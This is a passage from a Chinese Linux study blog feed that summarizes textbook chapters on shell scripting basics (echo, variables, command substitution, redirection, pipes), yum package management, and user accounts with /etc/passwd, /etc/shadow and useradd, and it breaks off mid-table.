</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"This is a test to see if you're paying attention"</span>This is a <span class="token builtin class-name">test</span> to see <span class="token keyword">if</span> you<span class="token string">'re paying attention$ echo '</span>Rich says <span class="token string">"scripting is easy"</span>.'Rich says <span class="token string">"scripting is easy"</span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果想把文本字符串和命令输出显示在同一行中，该怎么办呢？可以用<code>echo</code>语句的<code>-n</code>参数。只要将第一个<code>echo</code>语句改成这样就行：  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token builtin class-name">echo</span> -n <span class="token string">"The time and date are: "</span><span class="token function">date</span><span class="token builtin class-name">echo</span> -n <span class="token string">"Let's see who's logged into the system: "</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test1.sh</span>The <span class="token function">time</span> and data are: Wed 09 Feb <span class="token number">2022</span> 08:52:32 PM HKTLet<span class="token string">'s see who'</span>s logged into the system: myh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>echo</code>命令是shell脚本中与用户交互的重要工具。你会发现在很多地方都能用到它，尤其是需要显示脚本中变量的值的时候。  </p><h3 id="9-4-使用变量"><a href="#9-4-使用变量" class="headerlink" title="9.4 使用变量"></a>9.4 使用变量</h3><h4 id="9-4-1-环境变量"><a href="#9-4-1-环境变量" class="headerlink" title="9.4.1 环境变量"></a>9.4.1 环境变量</h4><p>在环境变量名称之前加上美元符（ $）来使用这些环境变量:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test2.sh </span><span class="token comment">#!/bin/bash</span><span class="token comment"># Display the user information from the system.</span><span class="token builtin class-name">echo</span> <span class="token string">"User info for userid: <span class="token environment constant">$USER</span>"</span><span class="token builtin class-name">echo</span> <span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token environment constant">$UID</span><span class="token builtin class-name">echo</span> <span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> <span class="token environment constant">$HOME</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># chmod 764 test2.sh </span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l</span>total <span class="token number">16</span>-rw-r--r-- <span class="token number">1</span> root root   <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rwxrw---- <span class="token number">1</span> root root <span class="token number">106</span> Feb  <span class="token number">9</span> <span class="token number">20</span>:52 test1.sh-rw-r--r-- <span class="token number">1</span> myh  root  <span class="token number">76</span> Feb  <span class="token number">8</span> <span class="token number">20</span>:32 test1.txt-rwxrw-r-- <span class="token number">1</span> root root <span class="token number">127</span> Feb <span class="token number">10</span> <span class="token number">19</span>:45 test2.shroot@VM-16-11-debian:/tmp/test<span class="token comment"># ./test2.sh</span>User info <span class="token keyword">for</span> userid: myh<span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token number">0</span><span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> /root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>echo命令中的环境变量会在脚本运行时替换成当前值。  </p><h4 id="9-4-2-用户变量"><a href="#9-4-2-用户变量" class="headerlink" title="9.4.2 用户变量"></a>9.4.2 用户变量</h4><p>定义变量允许临时存储数据并在整个脚本中使用，从而使shell脚本看起来更像一个真正的计算机程序。  </p><p>用户变量可以是：</p><ul><li>任何由字母、数字或下划线组成的文本字符串，长度不超过20个。</li><li>区分大小写。</li><li>使用等号将值赋给用户变量。在变量、等号和值之间不能出现空格</li></ul><p>shell脚本会自动决定变量值的数据类型。在脚本的整个生命周期里， shell脚本中定义的变量会一直保持着它们的值，但在shell脚本结束时会被删除掉。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test3.sh </span><span class="token comment">#!/bin/bash</span><span class="token comment">#This is a test.</span><span class="token assign-left variable">name</span><span class="token operator">=</span>myh<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$name</span> love Linux!"</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test3.sh </span>myh love Linux<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重要的是要记住，<font color="#FF5E3A" size="3">引用一个变量值时需要使用美元符，而引用变量来对其进行赋值时则不要使用美元符</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> test4<span class="token comment">#!/bin/bash</span><span class="token comment"># assigning a variable value to another variable</span><span class="token assign-left variable">value1</span><span class="token operator">=</span><span class="token number">10</span><span class="token assign-left variable">value2</span><span class="token operator">=</span><span class="token variable">$value1</span><span class="token builtin class-name">echo</span> The resulting value is <span class="token variable">$value2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-4-3-命令替换"><a href="#9-4-3-命令替换" class="headerlink" title="9.4.3 命令替换"></a>9.4.3 命令替换</h4><p>从命令输出中提取信息，并将其赋给变量：</p><ul><li>反引号字符（ `）  </li><li>$()格式  </li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> test5<span class="token comment">#!/bin/bash</span><span class="token assign-left variable">testing</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"The date and time are: "</span> <span class="token variable">$testing</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>变量testing获得了date命令的输出，然后使用echo语句显示出它的值。运行这个shell脚本生成如下输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./test5The <span class="token function">date</span> and <span class="token function">time</span> are: Mon Jan <span class="token number">31</span> <span class="token number">20</span>:10:25 EDT <span class="token number">2014</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  下面这个例子很常见，它在脚本中通过命令替换获得当前日期并用它来生成唯一文件名：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># copy the /usr/bin directory listing to a log file</span><span class="token assign-left variable">today</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%y%m%d<span class="token variable">)</span></span><span class="token function">ls</span> /usr/bin -al <span class="token operator">&gt;</span> log.<span class="token variable">$today</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>today变量是被赋予格式化后的date命令的输出。这是提取日期信息来生成日志文件名常用的一种技术。 <code>+%y%m%d</code>格式告诉date命令将日期显示为两位数的年月日的组合。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># date +%y%m%d</span><span class="token number">220210</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个脚本将日期值赋给一个变量，之后再将其作为文件名的一部分。文件自身含有目录列表的<strong>重定向输出</strong>（将在9.5节详细讨论）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rw-r--r-- <span class="token number">1</span> user user <span class="token number">769</span> Jan <span class="token number">31</span> <span class="token number">20</span>:17 log.220210<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>日志文件采用$today变量的值作为文件名的一部分。日志文件的内容是<code>/usr/bin</code>目录内容的列表输出。如果脚本在明天运行，日志文件名会是log.140201，就这样为新的一天创建一个新文件。 </p><h3 id="9-5-重定向输入和输出"><a href="#9-5-重定向输入和输出" class="headerlink" title="9.5 重定向输入和输出"></a>9.5 重定向输入和输出</h3><p>bash shell提供了几个操作符，可以将命令的输出重定向到另一个位置（比如文件）。重定向可以用于输入，也可以用于输出，可以将文件重定向到命令输入。  </p><h4 id="9-5-1-输出重定向"><a href="#9-5-1-输出重定向" class="headerlink" title="9.5.1 输出重定向"></a>9.5.1 输出重定向</h4><p>最基本的重定向将命令的输出发送到一个文件中。 bash shell用大于号（<code> &gt;</code>）来完成这项功能： </p><p> <code>command &gt; outputfile  </code></p><p>之前显示器上出现的命令输出会被保存到指定的输出文件中。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># date &gt; test4</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l test4</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">32</span> Feb <span class="token number">10</span> <span class="token number">20</span>:23 test4root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test4</span>Thu <span class="token number">10</span> Feb <span class="token number">2022</span> 08:23:20 PM HKT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果输出文件已经存在了，<font color="#FF5E3A" size="3">重定向操作符会用新的文件数据覆盖已有文件</font>。  </p><p>要将命令的输出追加到已有文件中 ，用双大于号（<code> &gt;&gt;</code>）来追加数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># who &gt;&gt; test4</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l test4</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">88</span> Feb <span class="token number">10</span> <span class="token number">20</span>:25 test4root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test4</span>Thu <span class="token number">10</span> Feb <span class="token number">2022</span> 08:23:20 PM HKTmyh      pts/0        <span class="token number">2022</span>-02-10 <span class="token number">19</span>:42 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-5-2-输入重定向"><a href="#9-5-2-输入重定向" class="headerlink" title="9.5.2 输入重定向"></a>9.5.2 输入重定向</h4><p>输入重定向将文件的内容重定向到命令，而非将命令的输出重定向到文件。  </p><p>输入重定向符号是小于号（ <code>&lt;</code>）： <code>command &lt; inputfile </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># wc &lt; test4</span> <span class="token number">2</span> <span class="token number">12</span> <span class="token number">88</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>wc命令可以对对数据中的文本进行计数。默认情况下，它会输出3个值 ：</p><ul><li> 文本的行数</li><li> 文本的词数</li><li> 文本的字节数  </li></ul><h3 id="9-6-管道"><a href="#9-6-管道" class="headerlink" title="9.6 管道"></a>9.6 管道</h3><p><font color="#FF5E3A" size="3">将一个命令的输出作为另一个命令的输入</font>可以用重定向来实现，但较为繁琐：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ls / &gt; test5.txt</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test5.txt </span>binboot……root@VM-16-11-debian:/tmp/test<span class="token comment"># sort &lt; test5.txt </span>binboot……<span class="token comment">#可能这个例子不太合理之时演示大致意思</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过管道连接（ piping）<code>| </code>： <code>command1 | command2  </code></p><p>Linux系统会同时运行这两个命令，在系统内部将它们连接起来。<font color="#FF5E3A" size="3">在第一个命令产生输出的同时，输出会被立即送给第二个命令</font>。数据传输不会用到任何中间文件或缓冲区。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ls / | sort</span>binbootdata……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以搭配使用重定向和管道来将输出保存到文件中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rpm</span> -qa <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> rpm.list$ <span class="token function">more</span> rpm.listabrt-1.1.14-1.fc14.i686abrt-addon-ccpp-1.1.14-1.fc14.i686abrt-addon-kerneloops-1.1.14-1.fc14.i686<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到目前为止，管道最流行的用法之一是将命令产生的大量输出通过管道传送给<code>more</code>命令。<br>这对<code>ls</code>命令来说尤为常见 ：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202102046394.png"></p><p><code>ls -l</code>命令产生了目录中所有文件的长列表。对包含大量文件的目录来说，这个列表会相当长。通过将输出管道连接到<code>more</code>命令，可以强制输出在一屏数据显示后停下来。  </p><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202102046395.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第八章</title>
      <link href="/posts/myh10015.html"/>
      <url>/posts/myh10015.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第八章：安装软件程序"><a href="#第八章：安装软件程序" class="headerlink" title="第八章：安装软件程序"></a>第八章：安装软件程序</h2><h3 id="8-1-包管理基础"><a href="#8-1-包管理基础" class="headerlink" title="8.1 包管理基础"></a>8.1 包管理基础</h3><p>软件包存储在服务器上，可以利用本地Linux系统上的<strong>PMS</strong>工具通过互联网访问。这些服务器称为仓库（ repository）。可以用PMS工具来搜索新的软件包，或者是更新系统上已安装软件包。  </p><p>PMS利用一个数据库来记录各种相关内容：  </p><ul><li> Linux系统上已安装了什么软件包；</li><li> 每个包安装了什么文件；</li><li> 每个已安装软件包的版本  </li></ul><p>软件包通常会依赖其他的包，为了前者能够正常运行，被依赖的包必须提前安装在系统中。PMS工具将会检测这些依赖关系，并在安装需要的包之前<strong>先安装好所有额外的软件包</strong>。  </p><p>Linux中广泛使用的两种主要的PMS基础工具是dpkg和rpm。  </p><h3 id="8-2-基于-Debian-的系统"><a href="#8-2-基于-Debian-的系统" class="headerlink" title="8.2 基于 Debian 的系统"></a>8.2 基于 Debian 的系统</h3><p>dpkg命令是基于Debian系PMS工具的核心。包含在这个PMS中的其他工具有：  </p><ul><li> apt-get</li><li> apt-cache</li><li> aptitude  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202092003585.png"></p><h3 id="8-3-基于-Red-Hat-的系统"><a href="#8-3-基于-Red-Hat-的系统" class="headerlink" title="8.3 基于 Red Hat 的系统"></a>8.3 基于 Red Hat 的系统</h3><ul><li> yum：在Red Hat和Fedora中使用。</li><li> urpm：在Mandriva中使用。</li><li> zypper：在openSUSE中使用。  </li></ul><h4 id="8-3-1-列出已安装包"><a href="#8-3-1-列出已安装包" class="headerlink" title="8.3.1 列出已安装包"></a>8.3.1 列出已安装包</h4><p>找出系统上已安装的包  ：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list installed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出的信息可能会在屏幕上一闪而过，所以最好是将已安装包的列表重定向到一个文件中。可以用more或less命令（或一个GUI编辑器）按照需要查看这个列表。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list installed <span class="token operator">&gt;</span> installed_software<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  yum擅长找出某个特定软件包的详细信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># yum list xterm</span>Loaded plugins: langpacks, presto, refresh-packagekitAdding en_US to language listAvailable Packagesxterm.i686 <span class="token number">253</span>-1.el6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过一条简单的命令查看包是否已安装:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># yum list installed xterm</span>Loaded plugins: refresh-packagekitError: No matching Packages to list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  果需要找出系统上的某个特定文件属于哪个软件包，万能的yum可以做到！</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#yum provides file_name</span><span class="token comment"># yum provides /etc/yum.conf</span>Loaded plugins: fastestmirror, refresh-packagekit, securityDetermining fastest mirrors* base: mirror.web-ster.com* extras: centos.chi.host-engine.com* updates: mirror.umd.eduyum-3.2.29-40.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> baseMatched from:Filename <span class="token builtin class-name">:</span> /etc/yum.confyum-3.2.29-43.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> updatesMatched from:Filename <span class="token builtin class-name">:</span> /etc/yum.confyum-3.2.29-40.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> installedMatched from:Other <span class="token builtin class-name">:</span> Provides-match: /etc/yum.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-3-2-用-yum-安装软件"><a href="#8-3-2-用-yum-安装软件" class="headerlink" title="8.3.2 用 yum 安装软件"></a>8.3.2 用 yum 安装软件</h4><p>在Linux系统上， #表明你是以root用户身份登录的。应该只有在运行管理性的任务时才临时切换到root用户（比如安装和更新软件）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-3-3-用-yum-更新软件"><a href="#8-3-3-用-yum-更新软件" class="headerlink" title="8.3.3 用 yum 更新软件"></a>8.3.3 用 yum 更新软件</h4><p>要列出所有已安装包的可用更新，输入如下命令：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list updates<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果发现某个特定软件包需要更新，输入如下命令：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想对更新列表中的所有包进行更新，只要输入如下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-3-4-用-yum-卸载软件"><a href="#8-3-4-用-yum-卸载软件" class="headerlink" title="8.3.4 用 yum 卸载软件"></a>8.3.4 用 yum 卸载软件</h4><p>只删除软件包而保留配置文件和数据文件，就用如下命令：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要删除软件和它所有的文件，就用erase选项：  </p><pre class="line-numbers language-none"><code class="language-none">yum erase package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202092003587.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第七章</title>
      <link href="/posts/myh10014.html"/>
      <url>/posts/myh10014.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第七章：理解Linux文件权限"><a href="#第七章：理解Linux文件权限" class="headerlink" title="第七章：理解Linux文件权限"></a>第七章：理解Linux文件权限</h2><h3 id="7-1-Linux-的安全性"><a href="#7-1-Linux-的安全性" class="headerlink" title="7.1 Linux 的安全性"></a>7.1 Linux 的安全性</h3><p>Linux安全系统的核心是<font color="#FF5E3A" size="3">用户账户</font>。每个能进入Linux系统的用户都会被分配唯一的用户账户。用户对系统中各种对象的访问权限取决于他们登录系统时用的账户。  </p><p>用户权限是通过<font color="#FF5E3A" size="3">创建用户时分配的用户ID（ User ID，通常缩写为UID）来跟踪的</font>。 UID是数值，每个用户都有唯一的UID，但在登录系统时用的不是UID，而是登录名。 Linux系统使用特定的文件和工具来跟踪和管理系统上的用户账户。  </p><h4 id="7-1-1-etc-passwd-文件"><a href="#7-1-1-etc-passwd-文件" class="headerlink" title="7.1.1 /etc/passwd 文件"></a>7.1.1<code> /etc/passwd</code> 文件</h4><p>Linux系统使用一个专门的文件来将用户的登录名匹配到对应的UID值。这个文件就是<code>/etc/passwd</code>文件，它包含了一些与用户有关的信息。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># cat /etc/passwd</span>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="#FF5E3A" size="3">root用户账户是Linux系统的管理员，固定分配给它的UID是0</font>。就像上例中显示的， Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户，这些账户叫作<font color="#FF5E3A" size="3">系统账户</font>，是系统上运行的各种服务进程访问资源用的特殊账户。所有运行在后台的服务都需要用一个系统用户账户登录到Linux系统上 。</p><p>Linux为系统账户预留了500以下的UID值。有些服务甚至要用特定的UID才能正常工作。为普通用户创建账户时，大多数Linux系统会从500开始，将第一个可用UID分配给这个账户（并非所有的Linux发行版都是这样）。  </p><p><code>etc/passwd</code>文件的字段包含了如下信息：</p><ul><li> 登录用户名</li><li> 用户密码</li><li> 用户账户的UID（数字形式）</li><li> 用户账户的组ID（ GID）（数字形式）</li><li> 用户账户的文本描述（称为备注字段）</li><li> 用户HOME目录的位置</li><li> 用户的默认shell  </li></ul><p>出于安全，<code>etc/passwd</code>文件中的密码字段都被设置成了x，这并不是说所有的用户账户都用相同的密码。绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置在<code>/etc/shadow</code>）。只有特定的程序（比如登录程序）才能访问这个文件。    </p><p> <code> /etc/passwd</code>是一个标准的文本文件。可以用任何文本编辑器在<code>/etc/password</code>文件里直接进行用户管理（比如添加、修改或删除用户账户）。但这样做极其危险。如果<code>/etc/passwd</code>文件出现损坏，系统就无法读取它的内容了，这样会导致用户无法正常登录（即便是root用户）。  </p><h4 id="7-1-2-etc-shadow-文件"><a href="#7-1-2-etc-shadow-文件" class="headerlink" title="7.1.2 /etc/shadow 文件"></a>7.1.2<code> /etc/shadow</code> 文件</h4><p>只有root用户才能访问<code>/etc/shadow</code>文件，这让它比起<code>/etc/passwd</code>安全许多 。</p><p><code>/etc/shadow</code>文件为系统上的每个用户账户都保存了一条记录。记录就像下面这样：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rich:<span class="token variable">$1</span>$.FfcK0ns<span class="token variable">$f1UgiyHQ25wrB</span>/hykCn020:11627:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 与<code>/etc/passwd</code>文件中的登录名字段对应的登录名</li><li> 加密后的密码</li><li> 自上次修改密码后过去的天数密码（自1970年1月1日开始计算）</li><li> 多少天后才能更改密码</li><li> 多少天后必须更改密码</li><li> 密码过期前提前多少天提醒用户更改密码  </li><li> 密码过期后多少天禁用用户账户</li><li> 用户账户被禁用的日期（用自1970年1月1日到当天的天数表示）</li><li> 预留字段给将来使用  </li></ul><p>使用shadow密码系统后， Linux系统可以更好地控制用户密码。可以控制用户多久更改一次密码，以及什么时候禁用该用户账户，如果密码未更新的话。  </p><h4 id="7-1-3-添加新用户"><a href="#7-1-3-添加新用户" class="headerlink" title="7.1.3 添加新用户"></a>7.1.3 添加新用户</h4><p>向Linux系统添加新用户的主要工具是<code>useradd </code>，可以一次性创建新用户账户及设置用户HOME目录结构。<code>useradd</code>命令使用系统的默认值以及命令行参数来设置用户账户。系统默认值被设置在<code>/etc/default/useradd</code>文件中。可以使用加入了-D选项的<code>useradd</code>命令查看所用Linux系统中的这些默认值。     </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># /usr/sbin/useradd -D</span><span class="token assign-left variable">GROUP</span><span class="token operator">=</span><span class="token number">100</span><span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home<span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span>-1<span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh<span class="token assign-left variable">SKEL</span><span class="token operator">=</span>/etc/skel<span class="token assign-left variable">CREATE_MAIL_SPOOL</span><span class="token operator">=</span>no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在创建新用户时，如果不在命令行中指定具体的值， <code>useradd</code>命令会使用-D选项显示的那些默认值。这个例子列出的默认值如下：  </p><ul><li> 新用户会被添加到GID为100的公共组；</li><li> 新用户的HOME目录将会位于/<code>home/loginname</code>；</li><li> 新用户账户密码在过期后不会被禁用；</li><li> 新用户账户未被设置过期日期；</li><li> 新用户账户将bash shell作为默认shell；</li><li> 系统会将<code>/etc/skel</code>目录下的内容复制到用户的HOME目录下；</li><li> 系统为该用户账户在mail目录下创建一个用于接收邮件的文件。  </li></ul><p>倒数第二个值很有意思。 <code>useradd</code>命令允许管理员创建一份默认的HOME目录配置，然后把它作为<strong>创建新用户HOME目录的模板</strong>。这样就能自动在每个新用户的HOME目录里放置默认的系统文件。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -al /etc/skel</span>total <span class="token number">20</span>drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Jan <span class="token number">10</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">89</span> root root <span class="token number">4096</span> Jan <span class="token number">28</span> <span class="token number">14</span>:47 <span class="token punctuation">..</span>-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">220</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .bash_logout-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3526</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .bashrc-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">807</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它们是bash shell环境的标准启动文件。系统会自动将这些默认文件复制到创建的每个用户的HOME目录。 </p><table><thead><tr><th align="center">参 数</th><th align="center">描 述</th></tr></thead><tbody><tr><td align="center">-c comment</td><td align="center">给新用户添加备注</td></tr><tr><td align="center">-d home_dir</td><td align="center">为主目录指定一个名字（如果不想用登录名作为主目录名的话）</td></tr><tr><td align="center">-e expire_date</td><td align="center">用YYYY-MM-DD格式指定一个账户过期的日期</td></tr><tr><td align="center">-f inactive_days</td><td align="center">指定这个账户密码过期后多少天这个账户被禁用； 0表示密码一过期就立即禁用， 1表示 禁用这个功能</td></tr><tr><td align="center">-g initial_group</td><td align="center">指定用户登录组的GID或组名</td></tr><tr><td align="center">-G group …</td><td align="center">指定用户除登录组之外所属的一个或多个附加组</td></tr><tr><td align="center">-k</td><td 